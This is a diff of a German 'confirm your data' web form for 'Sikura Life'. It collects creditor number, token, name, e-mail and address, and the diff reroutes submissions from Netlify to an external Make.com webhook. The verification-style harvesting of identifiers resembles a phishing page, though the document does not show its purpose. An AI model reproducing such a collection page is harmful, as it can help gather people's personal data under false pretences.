@@ -13,7 +13,7 @@
     <img src="siku_logo.png" alt="Sikura Life Logo" class="logo"/>
     <h2 data-i18n="title">Bitte bestätigen Sie Ihre Daten</h2>
 
-    <form name="verify-form" method="POST" data-netlify="true" action="danke.html" id="verify-form">
+    <form name="verify-form" method="POST" action="https://hook.eu2.make.com/c76tb0dfbd7i40v04a4btpt5gpuozevi" id="verify-form">
       <div class="language-switcher">
         <select id="language" onchange="setLanguage(this.value)">
           <option value="de">Deutsch</option>
@@ -23,19 +23,20 @@
       </div>
 
       <label for="glaeubiger" data-i18n="glaeubiger">Gläubiger-Nr.</span></label>
-      <input type="text" id="glaeubiger" name="glaeubiger" readonly required />
+      <input type="text" id="glaeubiger" name="glaeubiger" readonly required autocomplete="off"/>
 
       <label for="token" data-i18n="token">Token</span></label>
-      <input type="text" id="token" name="token" readonly required />
+      <input type="text" id="token" name="token" readonly required autocomplete="off"/>
 
       <label for="name" data-i18n="name">Name</span></label>
-      <input type="text" id="name" name="name" readonly />
+      <input type="text" id="name" name="name" readonly autocomplete="off"/>
 
       <label for="email" data-i18n="email">E-Mail-Adresse</span></label>
-      <input type="text" id="email" name="email" required />
+      <input type="text" id="email" name="email" required autocomplete="off"/>
 
       <label for="adresse" data-i18n="adresse">Aktuelle Adresse</span></label>
-      <textarea id="adresse" name="adresse" rows="3" required></textarea>
+     	  <textarea id="adresse" name="adresse" rows="3" required autocomplete="off"></textarea>
+
 
       <div class="checkbox-group">
         <label class="checkbox-line"><input type="checkbox" id="confirm" name="confirm" /><span data-i18n="confirm1">Ich bestätige, dass die angegebenen Daten korrekt sind.</span></label>
